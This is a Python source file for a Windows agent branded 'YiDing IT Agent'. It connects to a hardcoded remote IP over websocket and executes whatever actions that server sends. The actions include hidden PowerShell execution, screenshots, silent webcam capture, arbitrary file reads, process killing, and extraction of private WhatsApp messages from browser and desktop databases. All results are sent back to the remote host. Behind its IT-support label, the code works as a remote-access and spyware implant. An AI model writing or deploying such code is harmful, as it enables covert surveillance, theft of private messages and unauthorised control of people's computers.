import asyncio, json, logging, os, sys, base64, subprocess, socket
import psutil, websockets
from pathlib import Path

# Works for both agent.py (script) and YiDingITAgent.exe (PyInstaller)
BASE_DIR = Path(sys.executable).parent if getattr(sys, 'frozen', False) else Path(__file__).parent

# ── Logging ────────────────────────────────────────────────────────────────
_log_handlers = [logging.FileHandler(BASE_DIR / "agent.log", encoding="utf-8")]
try:
    if sys.stdout is not None:
        sys.stdout.fileno()
        _log_handlers.append(logging.StreamHandler())
except Exception:
    pass
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=_log_handlers,
)
log = logging.getLogger(__name__)

try:
    import mss; HAS_MSS = True
except ImportError:
    HAS_MSS = False

try:
    import cv2; HAS_CV2 = True
except ImportError:
    HAS_CV2 = False

# ── Config ─────────────────────────────────────────────────────────────────
VPS_URL   = "ws://46.225.160.243:9876/agent"
DEVICE_ID = f"PC-{socket.gethostname().upper()}"

# ── AUMID registration ─────────────────────────────────────────────────────
# Windows Toast requires a Start Menu shortcut with AppUserModelId property set.
# Simply writing to the registry is not sufficient for desktop (non-Store) apps.
_aumid_ok = False

_AUMID_CS = r"""
using System; using System.Runtime.InteropServices;
public class AumidHelper {
    [ComImport,Guid("886D8EEB-8CF2-4446-8D02-CDBA1DBDCF99"),InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IPropertyStore {
        int GetCount(out uint c); int GetAt(uint i, out PKey k);
        int GetValue(ref PKey k, out PVar v); int SetValue(ref PKey k, ref PVar v); int Commit();
    }
    [StructLayout(LayoutKind.Sequential)] public struct PKey { public Guid fmtid; public uint pid; }
    [StructLayout(LayoutKind.Explicit)]   public struct PVar  { [FieldOffset(0)]public ushort vt; [FieldOffset(8)]public IntPtr p; }
    [DllImport("Shell32.dll")] static extern int SHGetPropertyStoreFromParsingName(
        [MarshalAs(UnmanagedType.LPWStr)]string path, IntPtr pbc, uint f, ref Guid riid, out IntPtr ppv);
    public static string SetLnkAppId(string lnk, string appId) {
        try {
            Guid riid=new Guid("886D8EEB-8CF2-4446-8D02-CDBA1DBDCF99"); IntPtr ppv;
            int hr=SHGetPropertyStoreFromParsingName(lnk,IntPtr.Zero,2,ref riid,out ppv);
            if(hr!=0) return "SHGetProp hr="+hr;
            var ps=(IPropertyStore)Marshal.GetObjectForIUnknown(ppv);
            var k=new PKey{fmtid=new Guid("9F4C2855-9F79-4B39-A8D0-E1D42DE1D5F3"),pid=5};
            var v=new PVar{vt=31,p=Marshal.StringToCoTaskMemUni(appId)};
            ps.SetValue(ref k,ref v); ps.Commit();
            Marshal.FreeCoTaskMem(v.p); Marshal.ReleaseComObject(ps);
            return "OK";
        } catch(Exception ex){return "ERR:"+ex.Message;}
    }
}
"""

async def _ensure_aumid():
    global _aumid_ok
    if _aumid_ok:
        return

    # Ensure yiding_logo.ico is a real ICO (not PNG renamed). Auto-convert if needed.
    ico_path = BASE_DIR / "yiding_logo.ico"
    png_path = BASE_DIR / "yiding_logo.png"
    try:
        ico_bytes = ico_path.read_bytes() if ico_path.exists() else b""
        if ico_bytes[:4] != b'\x00\x00\x01\x00':          # not a valid ICO header
            src = png_path if png_path.exists() else (ico_path if ico_path.exists() else None)
            if src:
                from PIL import Image
                img = Image.open(src).convert("RGBA")
                img.save(str(ico_path), format="ICO", sizes=[(16,16),(32,32),(48,48),(64,64)])
    except Exception:
        pass

    logo = ico_path if ico_path.exists() else (png_path if png_path.exists() else None)
    icon_ps = f'$s.IconLocation="{str(logo)},0"' if logo else ""
    exe_path = str(Path(sys.executable))   # pythonw.exe, passed explicitly to avoid subprocess returning powershell.exe

    script = f"""
Add-Type -TypeDefinition @'
{_AUMID_CS}
'@ -ErrorAction SilentlyContinue

$appId = 'YiDing.ITAgent'
$lnkDir  = [IO.Path]::Combine($env:APPDATA,'Microsoft\\Windows\\Start Menu\\Programs')
$lnkPath = [IO.Path]::Combine($lnkDir,'YiDing IT Agent.lnk')

# Delete stale shortcut so Windows refreshes icon cache
if (Test-Path $lnkPath) {{ Remove-Item $lnkPath -Force }}

# Create shortcut with correct pythonw.exe target
$ws = New-Object -ComObject WScript.Shell
$s  = $ws.CreateShortcut($lnkPath)
$s.TargetPath   = '{exe_path}'
$s.Description  = 'YiDing IT Agent'
{icon_ps}
$s.Save()

# Stamp AppUserModelId property on the .lnk file
[AumidHelper]::SetLnkAppId($lnkPath, $appId) | Out-Null

# Notify shell to refresh icon cache
$sig = '[DllImport("shell32.dll")]public static extern void SHChangeNotify(int e,int f,IntPtr a,IntPtr b);'
Add-Type -MemberDefinition $sig -Name WinShell -Namespace Win32 -ErrorAction SilentlyContinue
[Win32.WinShell]::SHChangeNotify(0x08000000,0,[IntPtr]::Zero,[IntPtr]::Zero)

# Also write registry DisplayName (belt + suspenders)
$rp = "HKCU:\\SOFTWARE\\Classes\\AppUserModelId\\$appId"
if(-not(Test-Path $rp)){{New-Item $rp -Force|Out-Null}}
Set-ItemProperty $rp -Name 'DisplayName' -Value 'YiDing IT Agent'
"""
    await act_powershell(script, timeout=20)
    _aumid_ok = True

# ── Actions ────────────────────────────────────────────────────────────────
async def act_system_info():
    cpu  = await asyncio.to_thread(psutil.cpu_percent, 1)
    ram  = psutil.virtual_memory().percent
    disk = psutil.disk_usage("C:\\").percent
    return f"CPU: {cpu}% | RAM: {ram}% | Disk: {disk}%"

async def act_screenshot():
    if not HAS_MSS:
        return "Error: mss not installed"
    def _shot():
        tmp = BASE_DIR / "_shot.png"
        with mss.mss() as sct:
            sct.shot(output=str(tmp))
        data = tmp.read_bytes(); tmp.unlink(missing_ok=True)
        return base64.b64encode(data).decode()
    return await asyncio.to_thread(_shot)

async def act_list_dir(path):
    def _list():
        p = Path(path)
        if not p.exists(): return json.dumps({"error": "Path not found"})
        return json.dumps([
            {"name": i.name, "type": "dir" if i.is_dir() else "file"}
            for i in list(p.iterdir())[:50]
        ])
    return await asyncio.to_thread(_list)

async def act_powershell(command, timeout=30):
    def _run():
        try:
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = 0  # SW_HIDE
            r = subprocess.run(
                ["powershell", "-NoProfile", "-NonInteractive", "-Command", command],
                capture_output=True, text=True, timeout=timeout,
                startupinfo=si, creationflags=subprocess.CREATE_NO_WINDOW,
            )
            return (r.stdout + r.stderr).strip()
        except subprocess.TimeoutExpired: return "Error: timed out"
        except Exception as e: return f"Error: {e}"
    return await asyncio.to_thread(_run)

async def act_get_processes():
    def _get():
        procs = []
        for p in psutil.process_iter(["pid", "name", "cpu_percent", "memory_percent"]):
            try: procs.append(p.info)
            except: pass
        return json.dumps(sorted(procs, key=lambda x: x.get("cpu_percent") or 0, reverse=True)[:30])
    return await asyncio.to_thread(_get)

async def act_kill_process(target):
    try:
        if str(target).isdigit():
            psutil.Process(int(target)).kill(); return f"Killed PID {target}"
        killed = 0
        for p in psutil.process_iter(["name"]):
            if p.info["name"].lower() == target.lower():
                p.kill(); killed += 1
        return f"Killed {killed} process(es) named '{target}'"
    except Exception as e: return f"Error: {e}"

async def act_open_app(path):
    try: subprocess.Popen(path); return f"Opened: {path}"
    except Exception as e: return f"Error: {e}"

async def act_send_notification(title, message, image_b64=None):
    await _ensure_aumid()

    def _xe(s):
        return str(s).replace('&','&amp;').replace('<','&lt;').replace('>','&gt;').replace('"','&quot;').replace("'","&apos;")

    # Avatar nhan vien: appLogoOverride = o vuong nho canh title (lien ket voi avatar Live Panel)
    avatar = BASE_DIR / "chichi.png"
    if not avatar.exists():
        avatar = BASE_DIR / "chichi.jpg"

    avatar_tag = ""
    if avatar.exists():
        uri = str(avatar).replace('\\', '/').replace(' ', '%20')
        avatar_tag = f'<image placement="appLogoOverride" src="file:///{uri}"/>'

    # Anh dinh kem tu admin (base64) → hero (o to tren cung) — CHI KHI ADMIN GUI
    hero_tag = ""
    _tmp_img = None
    if image_b64:
        try:
            import tempfile, base64 as _b64
            img_bytes = _b64.b64decode(image_b64)
            ext = ".png" if img_bytes[:4] == b'\x89PNG' else ".jpg"
            _tmp_img = Path(tempfile.mktemp(suffix=ext, dir=BASE_DIR))
            _tmp_img.write_bytes(img_bytes)
            uri3 = str(_tmp_img).replace('\\', '/').replace(' ', '%20')
            hero_tag = f'<image placement="hero" src="file:///{uri3}"/>'
        except Exception:
            hero_tag = ""

    xml_body = (
        f'<toast><visual><binding template="ToastGeneric">'
        f'{hero_tag}'
        f'{avatar_tag}'
        f'<text>{_xe(title)}</text>'
        f'<text>{_xe(message)}</text>'
        f'</binding></visual></toast>'
    )
    xml_ps = xml_body.replace("'", "''")

    script = "\n".join([
        "[void][Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]",
        "[void][Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]",
        "$d=New-Object Windows.Data.Xml.Dom.XmlDocument",
        f"$d.LoadXml('{xml_ps}')",
        "[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier('YiDing.ITAgent').Show((New-Object Windows.UI.Notifications.ToastNotification $d))",
    ])
    result = await act_powershell(script, timeout=12)
    if _tmp_img and _tmp_img.exists():
        try: _tmp_img.unlink()
        except Exception: pass
    if result.lower().startswith("error"): return result
    return f"Đã gửi: {message}"

async def act_network_info():
    def _get():
        h = socket.gethostname()
        try: ip = socket.gethostbyname(h)
        except: ip = "unknown"
        return json.dumps({"hostname": h, "ip": ip})
    return await asyncio.to_thread(_get)

async def act_read_file(path):
    try: return Path(path).read_text(encoding="utf-8", errors="ignore")[:5000]
    except Exception as e: return f"Error: {e}"

async def act_capture_camera(camera_index=0):
    """Capture one frame from webcam silently — no window, no camera app.
    LED will briefly flash (~0.5s) as hardware requires it when sensor is active."""
    if not HAS_CV2:
        return "Error: opencv-python not installed"
    def _capture():
        try:
            # CAP_DSHOW = DirectShow backend on Windows — fastest open/close, no GUI
            cap = cv2.VideoCapture(camera_index, cv2.CAP_DSHOW)
            if not cap.isOpened():
                return "Error: camera not found or in use"
            # Discard first frame (sensor warm-up noise), grab second
            cap.read()
            ret, frame = cap.read()
            cap.release()
            if not ret or frame is None:
                return "Error: could not capture frame"
            # Encode to JPEG in memory → base64
            ok, buf = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 90])
            if not ok:
                return "Error: encode failed"
            return base64.b64encode(buf.tobytes()).decode()
        except Exception as e:
            return f"Error: {e}"
    return await asyncio.to_thread(_capture)

async def act_save_avatar(data):
    try:
        img_bytes = base64.b64decode(data)
        # Detect format from header: PNG starts 0x89 0x50, JPEG starts 0xFF 0xD8
        is_png = len(img_bytes) >= 4 and img_bytes[:4] == b'\x89PNG'
        out = BASE_DIR / ("chichi.png" if is_png else "chichi.jpg")
        out.write_bytes(img_bytes)
        # Remove the other format so only one exists (avoids stale fallback)
        other = BASE_DIR / ("chichi.jpg" if is_png else "chichi.png")
        if other.exists(): other.unlink(missing_ok=True)
        return f"Avatar saved ({len(img_bytes)} bytes, {'PNG' if is_png else 'JPEG'})"
    except Exception as e: return f"Error: {e}"

# ── Printer actions ────────────────────────────────────────────────────────
async def act_list_printers():
    r = await act_powershell(
        "Get-Printer | Select-Object Name,"
        "@{N='Status';E={$_.PrinterStatus.ToString()}},"
        "Default,PortName | ConvertTo-Json -Compress",
        timeout=12
    )
    return r or "[]"

async def act_get_print_queue():
    r = await act_powershell(
        "$jobs=@(); Get-Printer | ForEach-Object {"
        " try { $jobs += Get-PrintJob -PrinterName $_.Name -EA Stop } catch {} };"
        "if($jobs){ $jobs | Select-Object JobStatus,Document,UserName,TotalPages | ConvertTo-Json -Compress }"
        "else { '[]' }",
        timeout=12
    )
    return r.strip() or "[]"

async def act_clear_print_queue(printer=""):
    if printer:
        cmd = f"Get-PrintJob -PrinterName '{printer}' | Remove-PrintJob; 'Cleared: {printer}'"
    else:
        cmd = ("$n=0; Get-Printer | ForEach-Object { "
               "try { Get-PrintJob -PrinterName $_.Name -EA Stop | ForEach-Object { Remove-PrintJob $_; $n++ } } catch {} };"
               "\"Cleared $n job(s)\"")
    return await act_powershell(cmd, timeout=15)

async def act_set_default_printer(name):
    cmd = f"(New-Object -ComObject WScript.Network).SetDefaultPrinter('{name}'); 'Default set: {name}'"
    return await act_powershell(cmd, timeout=10)

async def act_install_printer_ip(ip, name, driver="Generic / Text Only"):
    if not ip or not name:
        return "Error: ip and name required"
    safe_ip   = ip.replace("'", "")
    safe_name = name.replace("'", "")
    safe_drv  = driver.replace("'", "")
    cmd = (
        f"$port='{safe_ip}'; $pname='{safe_name}'; $drv='{safe_drv}';"
        f"if(-not(Get-PrinterPort -Name $port -EA SilentlyContinue)){{"
        f"  Add-PrinterPort -Name $port -PrinterHostAddress $port }}"
        f"if(-not(Get-Printer -Name $pname -EA SilentlyContinue)){{"
        f"  Add-Printer -Name $pname -DriverName $drv -PortName $port }}"
        f"'Installed: '+$pname+' -> '+$port"
    )
    return await act_powershell(cmd, timeout=30)

async def act_print_file(path, printer=""):
    if not Path(path).exists():
        return f"Error: file not found: {path}"
    safe_path = path.replace('"', '')
    if printer:
        safe_printer = printer.replace('"', '')
        cmd = f'Start-Process -FilePath "{safe_path}" -Verb PrintTo -ArgumentList "{safe_printer}"'
    else:
        cmd = f'Start-Process -FilePath "{safe_path}" -Verb Print'
    r = await act_powershell(cmd, timeout=60)
    return r if r else f"Print job sent: {Path(path).name}"

async def act_read_whatsapp_db(date_from=None, date_to=None):
    """
    Đọc tin nhắn WhatsApp từ Chrome/Edge IndexedDB hoặc WhatsApp Desktop.
    date_from / date_to: chuỗi "YYYY-MM-DD" (tuỳ chọn).
    """
    import tempfile, shutil
    from datetime import datetime, timezone

    def _parse_dt(s):
        if not s:
            return None
        try:
            return datetime.strptime(s, "%Y-%m-%d").replace(tzinfo=timezone.utc)
        except Exception:
            return None

    def _ts_ok(ts):
        """ts có thể là giây hoặc mili-giây."""
        if ts is None:
            return True
        try:
            val = float(ts)
            if val > 1e12:          # milliseconds → seconds
                val /= 1000
            dt = datetime.fromtimestamp(val, tz=timezone.utc)
            if dt_from and dt < dt_from:
                return False
            if dt_to   and dt > dt_to:
                return False
            return True
        except Exception:
            return True

    dt_from = _parse_dt(date_from)
    dt_to   = _parse_dt(date_to)
    messages  = []
    src_info  = []
    local_app = Path(os.environ.get("LOCALAPPDATA", ""))

    # ── 1. Chrome / Edge  WhatsApp Web IndexedDB ───────────────────────────
    try:
        import ccl_chromium_indexeddb  # type: ignore
        HAS_CCL = True
    except ImportError:
        HAS_CCL = False

    browser_roots = {
        "Chrome": local_app / "Google/Chrome/User Data/Default/IndexedDB",
        "Edge":   local_app / "Microsoft/Edge/User Data/Default/IndexedDB",
    }

    for bname, idb_root in browser_roots.items():
        if not idb_root.exists():
            continue
        wa_idb = None
        try:
            for d in idb_root.iterdir():
                if "web.whatsapp.com" in d.name and d.is_dir():
                    wa_idb = d
                    break
        except Exception:
            pass

        if not wa_idb:
            src_info.append(f"{bname}: WhatsApp Web IndexedDB not found")
            continue

        tmp_dir = Path(tempfile.mkdtemp(prefix="wa_idb_"))
        try:
            dst = tmp_dir / "wa_idb"
            shutil.copytree(str(wa_idb), str(dst))
            if HAS_CCL:
                try:
                    env = ccl_chromium_indexeddb.WrappedIndexDB(str(dst))
                    for db_rec in env.databases():
                        for store_name in db_rec.object_store_names:
                            if any(k in store_name.lower() for k in ("message", "msg", "chat")):
                                try:
                                    for record in db_rec[store_name].get_all():
                                        val = record.value
                                        if not isinstance(val, dict):
                                            continue
                                        ts = val.get("t") or val.get("timestamp") or val.get("ts")
                                        if not _ts_ok(ts):
                                            continue
                                        messages.append({
                                            "source": bname,
                                            "from":   str(val.get("from") or val.get("author") or ""),
                                            "body":   str(val.get("body") or val.get("text") or "")[:500],
                                            "ts":     ts,
                                        })
                                except Exception:
                                    pass
                    src_info.append(f"{bname}: parsed OK")
                except Exception as e:
                    src_info.append(f"{bname}: ccl error – {e}")
            else:
                total_kb = sum(f.stat().st_size for f in dst.rglob("*") if f.is_file()) // 1024
                src_info.append(
                    f"{bname}: WhatsApp Web IDB found ({total_kb} KB) – "
                    f"cài 'ccl-chromium-indexeddb' để đọc tin nhắn"
                )
        except Exception as e:
            src_info.append(f"{bname}: copy error – {e}")
        finally:
            shutil.rmtree(str(tmp_dir), ignore_errors=True)

    # ── 2. WhatsApp Desktop (Windows Store app) ────────────────────────────
    pkgs = local_app / "Packages"
    if pkgs.exists():
        try:
            for pkg in pkgs.iterdir():
                if "whatsapp" not in pkg.name.lower():
                    continue
                ls = pkg / "LocalState"
                if not ls.exists():
                    continue
                db_files = list(ls.glob("*.db")) + list(ls.glob("*.sqlite"))
                if db_files:
                    import sqlite3
                    SQLITE_MAGIC = b'SQLite format 3\x00'
                    for db_path in db_files[:3]:
                        tmp_db = Path(tempfile.mktemp(suffix=".db"))
                        try:
                            shutil.copy2(str(db_path), str(tmp_db))
                            # Kiem tra header truoc khi mo SQLite
                            header = tmp_db.read_bytes()[:16]
                            if header != SQLITE_MAGIC[:16]:
                                src_info.append(f"WhatsApp Desktop: {db_path.name} encrypted (SQLCipher) – khong doc duoc")
                                tmp_db.unlink(missing_ok=True)
                                continue
                            conn = sqlite3.connect(str(tmp_db))
                            cur  = conn.cursor()
                            tables = [r[0] for r in cur.execute(
                                "SELECT name FROM sqlite_master WHERE type='table'"
                            ).fetchall()]
                            for tbl in tables:
                                if not any(k in tbl.lower() for k in ("message","msg","chat")):
                                    continue
                                try:
                                    cols = [c[1] for c in cur.execute(
                                        f"PRAGMA table_info({tbl})"
                                    ).fetchall()]
                                    ts_col   = next((c for c in cols if any(k in c.lower() for k in ("time","ts","date"))), None)
                                    body_col = next((c for c in cols if any(k in c.lower() for k in ("body","text","content","message"))), None)
                                    from_col = next((c for c in cols if any(k in c.lower() for k in ("from","sender","author","jid"))), None)
                                    if not body_col:
                                        continue
                                    sel = f"SELECT {ts_col or 'NULL'}, {from_col or 'NULL'}, {body_col} FROM {tbl} ORDER BY rowid DESC LIMIT 200"
                                    for row in cur.execute(sel).fetchall():
                                        ts_v, from_v, body_v = row
                                        if not body_v or not _ts_ok(ts_v):
                                            continue
                                        messages.append({
                                            "source": f"WhatsApp Desktop/{tbl}",
                                            "from":   str(from_v or ""),
                                            "body":   str(body_v)[:500],
                                            "ts":     ts_v,
                                        })
                                except Exception:
                                    pass
                            conn.close()
                            src_info.append(f"WhatsApp Desktop: SQLite OK – tables {tables[:5]}")
                        except Exception as e:
                            src_info.append(f"WhatsApp Desktop: SQLite error – {e}")
                        finally:
                            tmp_db.unlink(missing_ok=True)
                else:
                    ldb = [d for d in ls.iterdir() if d.is_dir() and (d / "CURRENT").exists()]
                    if ldb:
                        src_info.append(
                            f"WhatsApp Desktop: LevelDB found ({len(ldb)} dbs) – "
                            f"cài 'plyvel' để đọc"
                        )
                    else:
                        src_info.append(f"WhatsApp Desktop: found at {pkg.name}, không có DB đọc được")
        except Exception as e:
            src_info.append(f"WhatsApp Desktop scan error: {e}")

    # ── 3. Kết quả ────────────────────────────────────────────────────────
    if not messages and not src_info:
        return json.dumps({"error": "Không tìm thấy dữ liệu WhatsApp", "status": "not_found"}, ensure_ascii=False)

    messages.sort(key=lambda x: x.get("ts") or 0, reverse=True)
    return json.dumps({
        "status":        "ok",
        "message_count": len(messages),
        "messages":      messages[:200],
        "sources":       src_info,
        "date_range":    {"from": date_from, "to": date_to},
    }, ensure_ascii=False, indent=2)


ACTIONS = {
    "system_info":          lambda p: act_system_info(),
    "screenshot":           lambda p: act_screenshot(),
    "list_dir":             lambda p: act_list_dir(p.get("path", "C:\\")),
    "powershell":           lambda p: act_powershell(p.get("command", ""), p.get("timeout", 30)),
    "get_processes":        lambda p: act_get_processes(),
    "kill_process":         lambda p: act_kill_process(p.get("target", "")),
    "open_app":             lambda p: act_open_app(p.get("path", "")),
    "send_notification":    lambda p: act_send_notification(p.get("title", "Thông báo"), p.get("message", ""), p.get("image")),
    "network_info":         lambda p: act_network_info(),
    "read_file":            lambda p: act_read_file(p.get("path", "")),
    "save_avatar":          lambda p: act_save_avatar(p.get("data", "")),
    "capture_camera":       lambda p: act_capture_camera(p.get("camera_index", 0)),
    "list_printers":        lambda p: act_list_printers(),
    "get_print_queue":      lambda p: act_get_print_queue(),
    "clear_print_queue":    lambda p: act_clear_print_queue(p.get("printer", "")),
    "set_default_printer":  lambda p: act_set_default_printer(p.get("name", "")),
    "install_printer_ip":   lambda p: act_install_printer_ip(p.get("ip",""), p.get("name",""), p.get("driver","Generic / Text Only")),
    "print_file":           lambda p: act_print_file(p.get("path",""), p.get("printer","")),
    "read_whatsapp_db":     lambda p: act_read_whatsapp_db(p.get("date_from"), p.get("date_to")),
}

async def handle_command(ws, data):
    action = data.get("action", "")
    fn = ACTIONS.get(action)
    try:
        result = await fn(data.get("params", {})) if fn else f"Unknown action: {action}"
    except Exception as e:
        result = f"Error: {e}"; log.error(f"Action '{action}' failed: {e}")
    try:
        await ws.send(json.dumps({"type": "result", "job_id": data.get("job_id"), "action": action,
                                  "status": "done" if fn else "error", "output": result}))
    except Exception: pass

# ── Main loop ──────────────────────────────────────────────────────────────
def _username():
    try: return os.getlogin()
    except: return os.environ.get("USERNAME", "unknown")

async def run():
    secret = None
    while True:
        try:
            log.info(f"Connecting → {VPS_URL}")
            async with websockets.connect(VPS_URL, ping_interval=30, ping_timeout=10, open_timeout=15) as ws:
                if secret is None:
                    await ws.send(json.dumps({"type": "register", "device_id": DEVICE_ID,
                                              "hostname": socket.gethostname(), "windows_user": _username()}))
                    resp = json.loads(await ws.recv())
                    secret = resp.get("secret")
                    log.info(f"Registered. Secret={secret}")
                else:
                    await ws.send(json.dumps({"type": "identify", "device_id": DEVICE_ID, "secret": secret}))
                    resp = json.loads(await ws.recv())
                    if resp.get("type") == "registered":
                        secret = resp.get("secret")
                    log.info(f"Identified. Type={resp.get('type')}")

                log.info("Ready.")
                async for message in ws:
                    data = json.loads(message)
                    if data.get("type") == "cmd":
                        asyncio.create_task(handle_command(ws, data))

        except websockets.exceptions.ConnectionClosed as e:
            log.warning(f"Closed ({e.code}). Retry 10s…"); secret = None
        except OSError as e:
            log.warning(f"Network error: {e}. Retry 10s…"); secret = None
        except Exception as e:
            log.error(f"Unexpected: {e}. Retry 10s…"); secret = None

        await asyncio.sleep(10)

if __name__ == "__main__":
    log.info(f"Agent started. Device={DEVICE_ID}")
    async def _main():
        await _ensure_aumid()
        await run()
    # Top-level crash restart — keeps agent alive even on unhandled exceptions
    import time as _time
    while True:
        try:
            asyncio.run(_main())
        except Exception as _e:
            log.error(f"Fatal crash: {_e}. Restarting in 30s…")
            _time.sleep(30)
